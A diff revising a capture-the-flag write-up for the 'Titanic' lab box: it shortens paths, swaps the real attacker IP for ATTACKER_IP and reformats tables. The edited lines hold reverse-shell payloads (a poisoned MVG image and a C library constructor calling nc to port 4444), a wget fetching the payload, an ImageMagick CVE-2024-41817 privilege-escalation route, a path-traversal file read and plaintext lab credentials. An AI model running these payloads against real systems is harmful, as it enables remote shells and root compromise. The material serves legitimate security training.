@@ -32,9 +32,9 @@ As `developer`, `/opt/scripts/identify_images.sh` runs every minute as root: it 
 **rustscan**
 
 ```bash
-rustscan -a "$IP_ADDRESS" -ulimit 5000 -- -sC -sV -oA "/home/julien/.hacklas/./targets/track-oscp/Titanic/nmap/quick"
+rustscan -a "$IP_ADDRESS" -ulimit 5000 -- -sC -sV -oA "nmap/quick"
 
-[julien@parrot Titanic]$ rustscan -a "10.129.231.221" -t 1000 -- -sC -sV -oA "/home/julien/.hacklas/./targets/track-oscp/Titanic/nmap/quick"
+[julien@parrot Titanic]$ rustscan -a "10.129.231.221" -t 1000 -- -sC -sV -oA "nmap/quick"
 .----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
 | {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
 | .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
@@ -46,13 +46,13 @@ ________________________________________
  --------------------------------------
 I scanned ports so fast, even my computer was surprised.
 
-[~] The config file is expected to be at "/home/julien/.rustscan.toml"
+[~] The config file is expected to be at "~/.rustscan.toml"
 [!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
 [!] Your file limit is very small, which negatively impacts RustScan's speed. Use the Docker image, or up the Ulimit with '--ulimit 5000'.
 Open 10.129.231.221:22
 Open 10.129.231.221:80
 [~] Starting Script(s)
-[>] Running script "nmap -vvv -p {{port}} -{{ipversion}} {{ip}} -sC -sV -oA /home/julien/.hacklas/./targets/track-oscp/Titanic/nmap/quick" on ip 10.129.231.221
+[>] Running script "nmap -vvv -p {{port}} -{{ipversion}} {{ip}} -sC -sV -oA nmap/quick" on ip 10.129.231.221
 Depending on the complexity of the script, results may take some time to appear.
 [~] Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-02-02 07:44 +08
 NSE: Loaded 156 scripts for scanning.
@@ -128,9 +128,9 @@ Nmap done: 1 IP address (1 host up) scanned in 6.73 seconds
 **nmap (full)**
 
 ```bash
-nmap -sC -sV -p- -oA "/home/julien/.hacklas/./targets/track-oscp/Titanic/nmap/full" "$IP_ADDRESS"
+nmap -sC -sV -p- -oA "nmap/full" "$IP_ADDRESS"
 
-[julien@parrot Titanic]$ nmap -sC -sV -p- -oA "/home/julien/.hacklas/./targets/track-oscp/Titanic/nmap/full" "10.129.231.221"
+[julien@parrot Titanic]$ nmap -sC -sV -p- -oA "nmap/full" "10.129.231.221"
 Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-02-02 07:45 +08
 Nmap scan report for 10.129.231.221
 Host is up (0.0045s latency).
@@ -574,7 +574,7 @@ push graphic-context
 
 viewbox 0 0 640 480
 
-fill 'url(https://example.com/image.jpg"|mknod /tmp/pipez p;/bin/sh 0</tmp/pipez|nc 10.10.14.63 4444 1>/tmp/pipez;rm -rf "/tmp/pipez)'
+fill 'url(https://example.com/image.jpg"|mknod /tmp/pipez p;/bin/sh 0</tmp/pipez|nc ATTACKER_IP 4444 1>/tmp/pipez;rm -rf "/tmp/pipez)'
 
 pop graphic-context
 ```
@@ -584,7 +584,7 @@ Hosted the file and dropped it into the images directory:
 ```bash
 find /opt/app/static/assets/images/ -type f -name "*.jpg" | xargs /usr/bin/magick identify >> metadata.log
 developer@titanic:/opt$ cd /opt/app/static/assets/images/
-developer@titanic:/opt/app/static/assets/images$ wget 'http://10.10.14.63:80/poisoned_image.mvg' -o pimage.mvg
+developer@titanic:/opt/app/static/assets/images$ wget 'http://ATTACKER_IP:80/poisoned_image.mvg' -o pimage.mvg
 developer@titanic:/opt/app/static/assets/images$ [
 ```
 
@@ -603,7 +603,7 @@ gcc -x c -shared -fPIC -o ./libxcb.so.1 - << EOF
 #include <unistd.h>
 
 __attribute__((constructor)) void init(){
-    system("mknod /tmp/pipez p;/bin/sh 0</tmp/pipez|nc 10.10.14.63 4444 1>/tmp/pipez;rm -rf /tmp/pipez");
+    system("mknod /tmp/pipez p;/bin/sh 0</tmp/pipez|nc ATTACKER_IP 4444 1>/tmp/pipez;rm -rf /tmp/pipez");
     exit(0);
 }
 EOF
@@ -667,13 +667,20 @@ Stage result: a shell as `root` and `root.txt`. The shell wasn't upgraded — th
 
 ## Credentials
 
-| Source                            | Credential                                | Notes                      |
-| --------------------------------- | ----------------------------------------- | -------------------------- |
-| `docker-compose.yml` (Gitea repo) | MySQL root: `root:MySQLP@$$w0rd!`         | Not used on the path taken |
-| `docker-compose.yml` (Gitea repo) | MySQL app user: `sql_svc:sql_password`    | Not used on the path taken |
-| `gitea.db` `user` table           | `administrator` pbkdf2 hash (see Stage 2) | Not cracked                |
-| `gitea.db` `user` table           | `developer` pbkdf2 hash → `25282528`      | Cracked; foothold          |
-| SSH                               | `developer:25282528`                      | Foothold shell             |
+**`docker-compose.yml` (Gitea repo)** — MySQL root: `root:MySQLP@$$w0rd!`
+Not used on the path taken.
+
+**`docker-compose.yml` (Gitea repo)** — MySQL app user: `sql_svc:sql_password`
+Not used on the path taken.
+
+**`gitea.db` `user` table** — `administrator` pbkdf2 hash (see Stage 2)
+Not cracked.
+
+**`gitea.db` `user` table** — `developer` pbkdf2 hash → `25282528`
+Cracked; foothold.
+
+**SSH** — `developer:25282528`
+Foothold shell.
 
 ---
 
@@ -696,18 +703,17 @@ Stage result: a shell as `root` and `root.txt`. The shell wasn't upgraded — th
 
 ## Tools & cheat sheet
 
-| Tool                                     | Purpose in this box                             | Key command                                                                                                   |
-| ---------------------------------------- | ----------------------------------------------- | ------------------------------------------------------------------------------------------------------------- |
-| `rustscan`                               | Fast port sweep feeding nmap                    | `rustscan -a <ip> -ulimit 5000 -- -sC -sV`                                                                    |
-| `nmap`                                   | Full-range service/script scan                  | `nmap -sC -sV -p- -oA full <ip>`                                                                              |
-| `ffuf`                                   | VHost discovery (found `dev`)                   | `ffuf -w <dns-wordlist> -u http://titanic.htb -H 'Host: FUZZ.titanic.htb' -fc 301`                            |
-| Gitea (`dev.titanic.htb`)                | Leaked `docker-compose.yml` + app source        | browse repos / `git rebase -i --root`                                                                         |
-| LFI `/download?ticket=`                  | Path-traversal file read → config + `gitea.db`  | `curl --path-as-is '.../download?ticket=../../../../../../../../../home/developer/gitea/data/gitea/gitea.db'` |
-| `sqlite3`                                | Read Gitea `user` table                         | `select * from user;`                                                                                         |
-| `giteaToHashcat.py`                      | Convert Gitea hash → hashcat format             | `python giteaToHashcat.py ../gitea.db`                                                                        |
-| hashcat                                  | Crack developer pbkdf2 hash → `25282528`        | — (command not captured in draft)                                                                             |
-| `nxc` / `ssh`                            | Validate creds, log in as `developer`           | `ssh developer@titanic.htb`                                                                                   |
-| `magick --version`                       | Confirm ImageMagick 7.1.1-35                    | `magick --version`                                                                                            |
-| `gcc`                                    | Build malicious `libxcb.so.1` (constructor RCE) | `gcc -x c -shared -fPIC -o ./libxcb.so.1 - << EOF ... EOF`                                                    |
-| CVE-2024-41817 PoC                       | Empty-path config/lib load → root               | [Dxsk/CVE-2024-41817-poc](https://github.com/Dxsk/CVE-2024-41817-poc)                                         |
-| cron (`/opt/scripts/identify_images.sh`) | Root-run `magick` over images dir (trigger)     | drop `libxcb.so.1` into `/opt/app/static/assets/images`                                                       |
+- [`rustscan`](/hacklas/enumeration/port-scan/rustscan.md) — Fast port sweep feeding nmap
+- [`nmap`](/hacklas/enumeration/port-scan/nmap.md) — Full-range service/script scan
+- [`ffuf`](/hacklas/enumeration/ffuf.md) — VHost discovery (found `dev`)
+- [Gitea (`dev.titanic.htb`)](/hacklas/enumeration/git/gitea.md) — Leaked `docker-compose.yml` + app source
+- [LFI `/download?ticket=`](/hacklas/infiltration/web/file-traversal-lfi-rfi.md) — Path-traversal file read → config + `gitea.db`
+- [`sqlite3`](/hacklas/enumeration/db/sqlite.md) — Read Gitea `user` table
+- **`giteaToHashcat.py`** — Convert Gitea hash → hashcat format
+- [`hashcat`](/hacklas/infiltration/cracking/hashcat.md) — Crack developer pbkdf2 hash → `25282528`
+- [`nxc`](/hacklas/infiltration/password_spray/nxc.md) / **`ssh`** — Validate creds, log in as `developer`
+- **`magick --version`** — Confirm ImageMagick 7.1.1-35
+- **`gcc`** — Build malicious `libxcb.so.1` (constructor RCE)
+- **CVE-2024-41817 PoC** — Empty-path config/lib load → root
+  - [Dxsk/CVE-2024-41817-poc](https://github.com/Dxsk/CVE-2024-41817-poc)
+- **cron (`/opt/scripts/identify_images.sh`)** — Root-run `magick` over images dir (trigger)
